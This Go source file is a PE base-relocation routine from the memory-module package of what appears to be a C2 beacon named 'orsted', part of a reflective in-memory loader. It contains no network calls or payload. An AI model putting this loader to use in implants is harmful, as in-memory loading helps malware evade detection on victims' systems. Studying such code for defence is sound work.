package relocation

import (
	"encoding/binary"
	"unsafe"

	"orsted/beacon/modules/memorymodule/utils/helper"
	"orsted/beacon/modules/memorymodule/utils/mem"
	"orsted/beacon/modules/memorymodule/utils/memmoduletypes"
	"orsted/beacon/utils"
)

func PerformBaseRelocation(pEntryBaseRelocDataDir memmoduletypes.PIMAGE_DATA_DIRECTORY, pBaseAddress uintptr, pPreferableAddress uintptr) error {
	relocation_table := uintptr(pEntryBaseRelocDataDir.VirtualAddress) + pBaseAddress

	var relocations_processed int = 0
	deltaImageBase := pBaseAddress - pPreferableAddress
    utils.Print(deltaImageBase)

	for {

		relocation_block := *(*memmoduletypes.IMAGE_BASE_RELOCATION)(unsafe.Pointer(uintptr(relocation_table + uintptr(relocations_processed))))
		relocEntry := relocation_table + uintptr(relocations_processed) + 8
		if relocation_block.BlockSize == 0 && relocation_block.VirtualAddress == 0 {
			break
		}
		relocationsCount := (relocation_block.BlockSize - 8) / 2

		relocationEntries := make([]memmoduletypes.BASE_RELOCATION_ENTRY, relocationsCount)

		for i := 0; i < int(relocationsCount); i++ {
			relocationEntries[i] = *(*memmoduletypes.BASE_RELOCATION_ENTRY)(unsafe.Pointer(relocEntry + uintptr(i*2)))
		}
		for _, relocationEntry := range relocationEntries {
			if relocationEntry.Type() == 0 {
				continue
			}
			var size uintptr
			byteSlice := make([]byte, unsafe.Sizeof(size))
			relocationRVA := uint32(relocation_block.VirtualAddress) + uint32(relocationEntry.Offset())

            // Reading Memory
            mem.Memcpy(unsafe.Pointer(&byteSlice[0]), unsafe.Pointer(pBaseAddress + uintptr(relocationRVA)), int(unsafe.Sizeof(size)))

			addressToPatch := uintptr(binary.LittleEndian.Uint64(byteSlice))
			addressToPatch += deltaImageBase
			a2Patch := helper.UintptrToBytes(addressToPatch)

            // Writing Memory
            dest := unsafe.Pointer(pBaseAddress + uintptr(relocationRVA))
            mem.Memcpy(dest, unsafe.Pointer(&a2Patch[0]), len(a2Patch))

		}
		relocations_processed += int(relocation_block.BlockSize)

	}


	return nil
}


